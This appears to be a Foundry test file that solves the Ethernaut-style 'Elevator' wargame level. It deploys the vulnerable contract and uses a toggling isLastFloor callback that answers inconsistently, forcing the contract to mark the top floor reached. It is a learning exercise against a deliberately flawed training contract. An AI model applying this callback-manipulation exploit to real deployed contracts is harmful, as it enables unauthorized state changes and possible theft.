// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import "forge-std/Test.sol";
import "forge-std/console.sol";

import "../../src/11_Elevator/Elevator.sol";

contract ElevatorTest is Test {

    Elevator public elevatorVictim;
    address public ownerElevator;
    address public hackUser;
    bool public counter = false;


    function setUp() public {

        ownerElevator = vm.addr(1);
        hackUser = vm.addr(2);

        vm.startPrank(ownerElevator);

        elevatorVictim = new Elevator();

        vm.stopPrank();
    }


    function test_HackElevator() public {

        elevatorVictim.goTo(1);

        console.log(elevatorVictim.top());
        console.log(elevatorVictim.floor());

        elevatorVictim.goTo(2);
        console.log(elevatorVictim.top());
        console.log(elevatorVictim.floor());


    }

    function isLastFloor(uint _floor) public returns (bool) {
        //console.log("function");
        if (!counter) { // if (true)
            counter = true; // change the counter to true
            return false; // first return value will be false
        } else {
            counter = false; // change the counter to false
            return true; // second return value will be true
        }
    }

}
